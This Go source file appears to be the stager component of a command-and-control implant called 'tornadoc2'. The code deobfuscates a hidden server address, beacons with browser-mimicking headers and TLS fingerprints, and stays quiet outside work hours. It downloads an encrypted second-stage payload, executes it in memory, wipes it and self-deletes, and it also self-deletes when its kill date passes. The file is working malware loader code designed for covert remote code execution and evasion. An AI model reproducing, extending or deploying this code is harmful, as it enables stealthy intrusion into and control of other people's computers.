package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"tornadoc2/agent/core"
	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
	"tornadoc2/agent/internal/tlsfp"
)

var ObfKeyHex = ""

var (
	DefaultURL      = ""
	KillDaysRaw     = "30"
	DefaultSleepRaw = "5"
	StageKeyHex     = "" // 32-byte AES key, hex-encoded
	StageName       = ""
	RootCAPem     = ""
	VerboseRaw    = "false"
	ProfileJSON   = ""
	TransportMode = "http"
	ServerPubKeyPem = ""
	TLSProfile = "go"
	WorkHoursStartRaw = ""
	WorkHoursEndRaw   = ""
	ServerECDHPubkey = ""

	// IdentityRole disambiguates two builds from the same tree on
	// the same host. The builder emits it only when the operator
	// set one explicitly on a stager build; empty is the default
	// and preserves the pre-role fingerprint. When the stager and
	// the full agent it launches are both built with the same
	// role, the session handoff works as it always did.
	IdentityRole = ""
)

var (
	KillDays     = 30
	DefaultSleep = 5
	Verbose      = false
	serverPub *ecdsa.PublicKey
	shaping *features.ShapingSpec
	wire *crypto.WireSession
)

func main() {
	if ObfKeyHex != "" {
		DefaultURL  = deobf(DefaultURL, ObfKeyHex)
		ProfileJSON = deobf(ProfileJSON, ObfKeyHex)

	}
	if !strings.HasPrefix(DefaultURL, "https://") {
		fmt.Fprintln(os.Stderr,
			"[stager] refusing to run: DefaultURL is not https")
		os.Exit(2)
	}

	DefaultURL = strings.TrimRight(DefaultURL, "/")

	if v, err := strconv.Atoi(KillDaysRaw); err == nil {
		KillDays = v
	}
	if v, err := strconv.Atoi(DefaultSleepRaw); err == nil {
		DefaultSleep = v
	}
	Verbose = (VerboseRaw == "true")

	workStart := clock(WorkHoursStartRaw, 0)
	workEnd := clock(WorkHoursEndRaw, 0)

	cfg := core.Config{
		DefaultURL:       DefaultURL,
		ProfileJSON:      ProfileJSON,
		RootCAPem:        RootCAPem,
		ServerPubKeyPem:  ServerPubKeyPem,
		ServerECDHPubkey: ServerECDHPubkey,
		TransportMode:    TransportMode,
		KillDays:         KillDays,
		Verbose:          Verbose,
		TLSProfile:       TLSProfile,
		WorkHoursStart:   workStart,
		WorkHoursEnd:     workEnd,
		IdentityRole:     IdentityRole,
	}

	if ServerPubKeyPem != "" {
		raw, err := base64.StdEncoding.DecodeString(ServerPubKeyPem)
		if err == nil {
			serverPub = core.ParseECDSAPublicKey(raw)
		}
		if serverPub == nil && Verbose {
			fmt.Fprintln(os.Stderr,
				"[stager] embedded server pubkey did not parse; "+
					"payload signature verification disabled")
		}
	} else if Verbose {
		fmt.Fprintln(os.Stderr,
			"[stager] no embedded server pubkey; payload signature "+
				"verification disabled")
	}

	prof := protocol.Profile{
		UserAgent:   "Mozilla/5.0",
		BeaconPath:  "/beacon",
		TasksPath:   "/tasks",
		ResultsPath: "/results",
	}
	if ProfileJSON != "" {
		if err := json.Unmarshal([]byte(ProfileJSON), &prof); err != nil {
			if raw, derr := base64.StdEncoding.DecodeString(ProfileJSON); derr == nil {
				_ = json.Unmarshal(raw, &prof)
			}
		}

		prof = prof.Resolved()
		if prof.BeaconPath == "" {
			prof.BeaconPath = "/beacon"
		}
		if prof.TasksPath == "" {
			prof.TasksPath = "/tasks"
		}
		if prof.ResultsPath == "" {
			prof.ResultsPath = "/results"
		}
	}
	if prof.UserAgent == "" {
		prof.UserAgent = "Mozilla/5.0 (Windows NT 10.0; " +
			"Win64; x64) AppleWebKit/537.36 " +
			"(KHTML, like Gecko) Chrome/120.0.0.0 " +
			"Safari/537.36"
	}

	if ProfileJSON != "" {
		var raw struct {
			Shaping *features.ShapingSpec `json:"shaping"`
		}
		if err := json.Unmarshal([]byte(ProfileJSON), &raw); err == nil {
			if raw.Shaping != nil {
				if verr := features.ValidateShapingSpec(raw.Shaping); verr == nil {
					shaping = raw.Shaping
				} else if Verbose {
					fmt.Fprintf(os.Stderr,
						"[stager] shaping invalid, disabled: %v\n",
						verr)
				}
			}
		}
	}

	if ServerECDHPubkey != "" {
		ws, werr := crypto.NewWireSession(ServerECDHPubkey)
		if werr != nil {
			fmt.Fprintln(os.Stderr,
				"[stager] wire session:", werr)
			os.Exit(1)
		}
		wire = ws
		if Verbose {
			fmt.Fprintln(os.Stderr,
				"[stager] wire encryption enabled")
		}
	}

	deadline := time.Now().Add(
		time.Duration(KillDays) * 24 * time.Hour)

	time.Sleep(time.Duration(2+rand.Intn(8)) * time.Second)

	tlsCfg, err := core.BuildTLSConfig(cfg)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[stager] tls config:", err)
		os.Exit(1)
	}
	protocol.WireTLSProfile = TLSProfile

	client, err := tlsfp.NewHTTPClient(
		protocol.WireTLSProfile, tlsCfg)
	if err != nil {
		fmt.Fprintln(os.Stderr,
			"[stager] tls profile:", err)
		os.Exit(1)
	}

	var session protocol.CheckinResponse
	backoff := 5 * time.Second
	for {
		if time.Now().After(deadline) {
			_ = platform.SelfDelete()
			os.Exit(0)
		}
		var err error
		session, err = checkin(client, prof, cfg)
		if err == nil {
			break
		}
		if Verbose {
			fmt.Fprintf(os.Stderr,
				"[stager] checkin: %v (retry %v)\n", err, backoff)
		}

		jitter := 0.7 + rand.Float64()*0.6
		time.Sleep(time.Duration(float64(backoff) * jitter))
		if backoff < time.Minute {
			backoff *= 2
		}
	}

	for time.Now().Before(deadline) {
		if !insideWorkHours() {
			time.Sleep(pollInterval())
			continue
		}
		tasks, err := fetchTasks(client, prof, session.Cookie, cfg)
		if err != nil {
			if isSessionInvalid(err) {
				if Verbose {
					fmt.Fprintf(os.Stderr,
						"[stager] cookie invalid, "+
							"re-check-in\n")
				}
				if fresh, cerr := checkin(client, prof, cfg); cerr == nil {
					session = fresh
				}
			}
			time.Sleep(pollInterval())
			continue
		}
		for _, t := range tasks {
			if t.Verb != "stage_load" || len(t.Args) < 3 {
				continue
			}

			if serverPub != nil {
				if !verifyTask(serverPub, t) {
					if Verbose {
						fmt.Fprintf(os.Stderr,
							"[stager] dropping task %s: "+
								"signature verification failed\n",
							t.ID)
					}
					continue
				}
			}

			for attempt := 0; attempt < 3; attempt++ {
				if runStage(client, prof,
					session.Cookie, t, cfg) {
					return
				}
				time.Sleep(pollInterval())
			}
			return
		}
		time.Sleep(pollInterval())
	}
	_ = platform.SelfDelete()
	os.Exit(0)
}

func checkin(c *http.Client, prof protocol.Profile,
	cfg core.Config) (protocol.CheckinResponse, error) {
	var out protocol.CheckinResponse
	ident := core.GatherIdentity(cfg)
	ident.Stager = true
	body, _ := json.Marshal(protocol.CheckinRequest{Identity: ident})

	if wire != nil {
		enc, werr := wire.EncryptRequest(body)
		if werr != nil {
			return out, fmt.Errorf("checkin encrypt: %w", werr)
		}
		body = enc
	}

	req, _ := http.NewRequest("POST", DefaultURL+prof.BeaconPath,
		bytes.NewReader(body))
	applyHeaders(req, prof, "POST")
	resp, err := c.Do(req)
	if err != nil {
		return out, err
	}
	defer resp.Body.Close()

	wantStatus := 200
	if prof.Status != nil && prof.Status.Beacon > 0 {
		wantStatus = prof.Status.Beacon
	}
	if resp.StatusCode != wantStatus {
		return out, fmt.Errorf("checkin status %d (wanted %d)",
			resp.StatusCode, wantStatus)
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return out, err
	}

	if shaping != nil && shaping.CheckinResponse != nil &&
		shaping.CheckinResponse.Placement != nil {
		body = extractPlacedEnvelope(resp, body,
			shaping.CheckinResponse.Placement)
	}

	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return out, fmt.Errorf("checkin decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if shaping != nil && shaping.CheckinResponse != nil {
		inner, uerr := features.ShapeUnwrap(body,
			shaping.CheckinResponse)
		if uerr != nil {
			return out, fmt.Errorf("checkin shape: %w", uerr)
		}
		body = inner
	}
	if err := json.Unmarshal(body, &out); err != nil {
		return out, err
	}
	return out, nil
}

func fetchTasks(c *http.Client, prof protocol.Profile,
	cookie string, _ core.Config) ([]protocol.Task, error) {
	req, _ := http.NewRequest("GET", DefaultURL+prof.TasksPath, nil)
	cookieName := prof.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+cookie)

	if wire != nil {
		epk, rerr := wire.RotateEphemeral()
		if rerr != nil {
			return nil, fmt.Errorf("tasks rotate epk: %w", rerr)
		}
		req.Header.Set("X-ECDH-Pubkey", epk)
	}

	applyHeaders(req, prof, "GET")
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	wantStatus := 200
	if prof.Status != nil && prof.Status.Tasks > 0 {
		wantStatus = prof.Status.Tasks
	}
	if resp.StatusCode != wantStatus {
		return nil, fmt.Errorf("tasks status %d (wanted %d)",
			resp.StatusCode, wantStatus)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if shaping != nil && shaping.TasksResponse != nil &&
		shaping.TasksResponse.Placement != nil {
		body = extractPlacedEnvelope(resp, body,
			shaping.TasksResponse.Placement)
	}

	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf("tasks decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if shaping != nil && shaping.TasksResponse != nil {
		inner, uerr := features.ShapeUnwrap(body,
			shaping.TasksResponse)
		if uerr != nil {
			return nil, fmt.Errorf("tasks shape: %w", uerr)
		}
		body = inner
	}
	var tasks []protocol.Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func runStage(c *http.Client, prof protocol.Profile, cookie string,
	t protocol.Task, _ core.Config) bool {

	name := t.Args[0]
	wantSHA := strings.ToLower(t.Args[1])
	expected, _ := strconv.Atoi(t.Args[2])

	if Verbose {
		fmt.Fprintf(os.Stderr, "[stager] fetching %s (%d bytes)\n",
			name, expected)
	}

	stagePath := "/stage/" + name
	if prof.Stager != nil && prof.Stager.Path != "" {
		stagePath = prof.Stager.Path
		if !strings.Contains(stagePath, "?") {
			stagePath += "?name=" + url.QueryEscape(name)
		}
	}
	req, _ := http.NewRequest("GET",
		DefaultURL+stagePath, nil)
	cookieName := prof.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+cookie)
	applyHeaders(req, prof, "GET")
	resp, err := c.Do(req)
	if err != nil {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID, Error: "fetch: " + err.Error()})
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID, Error: fmt.Sprintf("fetch status %d",
				resp.StatusCode)})
		return false
	}

	const maxStageBytes = 128 * 1024 * 1024
	raw, err := io.ReadAll(io.LimitReader(
		resp.Body, maxStageBytes+1))
	if err != nil {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID, Error: "read: " + err.Error()})
		return false
	}
	if len(raw) > maxStageBytes {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID, Error: "payload exceeds size cap"})
		return false
	}

	if serverPub != nil {
		sigB64 := resp.Header.Get("X-Payload-Sig")
		if sigB64 == "" {
			postResult(c, prof, cookie, protocol.Result{
				ID: t.ID, Error: "missing payload signature"})
			return false
		}
		sigDER, err := base64.StdEncoding.DecodeString(sigB64)
		if err != nil {
			postResult(c, prof, cookie, protocol.Result{
				ID: t.ID, Error: "bad signature encoding"})
			return false
		}
		digest := sha256.Sum256(raw)
		if !ecdsa.VerifyASN1(serverPub, digest[:], sigDER) {
			postResult(c, prof, cookie, protocol.Result{
				ID: t.ID, Error: "payload signature invalid"})
			return false
		}
	}

	payload := raw
	if StageKeyHex != "" {
		key, err := hex.DecodeString(StageKeyHex)
		if err != nil || len(key) < 32 {
			postResult(c, prof, cookie, protocol.Result{
				ID: t.ID, Error: "bad stage key"})
			return false
		}
		plain, err := aesGCMDecrypt(key, raw)
		if err != nil {
			postResult(c, prof, cookie, protocol.Result{
				ID: t.ID, Error: "decrypt: " + err.Error()})
			return false
		}
		payload = plain
	}

	got := sha256.Sum256(payload)
	gotHex := hex.EncodeToString(got[:])
	if wantSHA != "" && gotHex != wantSHA {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID, Error: "sha256 mismatch"})
		return false
	}

	if len(payload) != expected {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID,
			Error: fmt.Sprintf("size mismatch: got %d want %d",
				len(payload), expected)})
		return false
	}

	if err := executeInMemory(payload); err != nil {
		postResult(c, prof, cookie, protocol.Result{
			ID: t.ID, Error: "exec: " + err.Error()})
		return false
	}

	postResult(c, prof, cookie, protocol.Result{
		ID: t.ID,
		Output: base64.StdEncoding.EncodeToString(
			[]byte("stage loaded\n")),
		ExitCode: 0,
	})

	for i := range payload {
		payload[i] = 0
	}

	_ = platform.SelfDelete()

	os.Exit(0)

	return true
}

func postResult(c *http.Client, prof protocol.Profile, cookie string,
	r protocol.Result) {
	var body []byte
	var err error
	if shaping != nil && shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(shaping.ResultsRequest, r)
		if err != nil {
			if Verbose {
				fmt.Fprintf(os.Stderr,
					"[stager] result shaping failed: %v\n", err)
			}
			return
		}
	} else {
		body, err = json.Marshal(r)
		if err != nil {
			return
		}
	}
	if wire != nil {
		enc, werr := wire.EncryptRequest(body)
		if werr != nil {
			if Verbose {
				fmt.Fprintf(os.Stderr,
					"[stager] result encrypt failed: %v\n", werr)
			}
			return
		}
		body = enc
	}
	req, _ := http.NewRequest("POST",
		DefaultURL+prof.ResultsPath, bytes.NewReader(body))
	cookieName := prof.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+cookie)
	applyHeaders(req, prof, "POST")
	resp, err := c.Do(req)
	if err == nil {
		resp.Body.Close()
	}
}

func aesGCMDecrypt(key, blob []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(blob) < ns {
		return nil, fmt.Errorf("blob too short")
	}
	iv, ct := blob[:ns], blob[ns:]
	return gcm.Open(nil, iv, ct, nil)
}

func verifyTask(pub *ecdsa.PublicKey, t protocol.Task) bool {
	if t.Signature == "" {
		return false
	}
	sig, err := base64.StdEncoding.DecodeString(t.Signature)
	if err != nil {
		return false
	}
	body, err := t.Unsigned()
	if err != nil {
		return false
	}
	digest := sha256.Sum256(body)
	return ecdsa.VerifyASN1(pub, digest[:], sig)
}

func isSessionInvalid(err error) bool {
	msg := err.Error()
	for _, code := range []string{
		"status 400", "status 401", "status 403", "status 404",
	} {
		if strings.Contains(msg, code) {
			return true
		}
	}
	return false
}

func pollInterval() time.Duration {
	base := float64(DefaultSleep)
	jitter := (rand.Float64() * 0.6) - 0.3 // [-0.3, 0.3)
	secs := base * (1.0 + jitter)
	if secs < 1.0 {
		secs = 1.0
	}
	return time.Duration(secs * float64(time.Second))
}

func applyHeaders(req *http.Request, prof protocol.Profile, method string) {
	req.Header.Set("User-Agent", prof.UserAgent)

	if method == "POST" {
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Accept",
			"application/json, text/plain, */*")
	} else {
		req.Header.Set("Accept",
			"text/html,application/xhtml+xml,"+
				"application/xml;q=0.9,*/*;q=0.8")
	}

	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	for k, v := range prof.RequestHeaders {
		req.Header.Set(k, v)
	}
	for k, v := range prof.ExtraHeaders {
		req.Header.Set(k, v)
	}
}

func clock(s string, def int) int {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "off", "disable", "none", "":
		return 0
	}
	if v, ok := core.ParseClock(s); ok {
		return v
	}
	return def
}

func insideWorkHours() bool {
	start := protocol.WorkHoursStart
	end := protocol.WorkHoursEnd
	if start == end {
		return true
	}
	now := time.Now()
	cur := now.Hour()*60 + now.Minute()
	if start < end {
		return cur >= start && cur < end
	}

	return cur >= start || cur < end
}

func deobf(encoded string, keyHex string) string {
	if encoded == "" || keyHex == "" {
		return encoded
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil || len(key) == 0 {
		return encoded
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded
	}
	out := make([]byte, len(raw))
	for i := range raw {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	return string(out)
}

func extractPlacedEnvelope(resp *http.Response, body []byte,
	pl *features.Placement) []byte {

	if pl == nil {
		return body
	}
	switch strings.ToLower(pl.Kind) {
	case "header":
		if pl.Name == "" {
			return body
		}
		if v := resp.Header.Get(pl.Name); v != "" {
			return []byte(v)
		}
	case "cookie":
		if pl.Name == "" {
			return body
		}
		for _, c := range resp.Cookies() {
			if c.Name == pl.Name {
				return []byte(c.Value)
			}
		}
	}
	return body
}